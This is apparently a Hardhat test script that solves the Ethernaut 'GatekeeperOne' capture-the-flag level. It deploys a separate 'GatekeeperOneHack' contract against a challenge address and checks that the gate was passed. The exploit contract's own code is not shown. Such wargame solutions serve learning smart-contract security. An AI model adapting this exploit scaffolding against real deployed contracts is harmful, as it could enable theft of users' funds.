const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const { isTypedArray } = require("util/types");
const util = require("../utils.js");

var scriptName = path.basename(__filename);

const CHALLENGE_ADDRESS = "0x520d590cD591b82F26b606DC0C613B760F3De6fb";
describe("GatekeeperOne", () => {
  beforeEach(async () => {
    const accounts = await hre.ethers.getSigners();
    deployer = accounts[0];
    hacker = accounts[1];
    const factory = await ethers.getContractFactory("GatekeeperOne");
    contract = factory.attach(CHALLENGE_ADDRESS);
  });

  it("initiates hack", async () => {
    console.log("deploying GatekeeperOneHack");
    const gateKeeperHackFactory = await ethers.getContractFactory(
      "GatekeeperOneHack"
    );
    const hackContract = await gateKeeperHackFactory.deploy(contract.address);
    await hackContract.deployed();
    console.log("GatekeeperOneHack deployed");

    const tx = await hackContract.enterGate({ gasLimit: 3e6 });
    await tx.wait();
    expect(await contract.entrant()).to.eq(deployer.address);
    util.updateTotalSolved(scriptName);
  });
});
